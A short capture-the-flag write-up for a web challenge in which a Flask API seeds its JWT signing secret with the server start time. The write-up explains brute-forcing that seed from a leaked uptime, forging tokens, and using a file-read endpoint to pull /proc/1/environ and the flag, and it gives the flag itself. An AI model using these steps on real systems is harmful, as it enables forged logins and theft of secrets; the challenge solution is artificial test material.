https://ctftime.org/event/2252/

# Random (Web)

DESCRIPTION
I've only had the time to make the API, but it should be working properly. Please make sure it's secure. If you can read any file you want, I'll make sure to reward you!

## Solution
The challenge is a Flask server that uses `round(time.time())` as its seed. 
So if we can have that we can sign our own jwts. It also gives us a leak of when the server was started:
```python
except:
    abort(Response(f'<h1>NOT AUTHORIZED</h1><br><br><br><br><br> This system has been up for {round(time.time()-time_started)} seconds fyi :wink:', status=403))
```

So we bruteforce the seed with something like this:
```python
start = get_start()
time_now = rounded(time.time())
SECRET = hashlib.sha256(str(time_now - start+100-i).encode()).hexdigest()
```

After we have the secret we can get a file read from `/api/file?filename=`
The flag is in a random directory though, so we just read `/proc/1/environ` and get the dir
Then just `/api/file?filename=/random_dir/flag.txt`

## Flag
`byuctf{expl01t_chains_involve_multiple_exploits_in_a_row}`

shafou - 18/05/2024
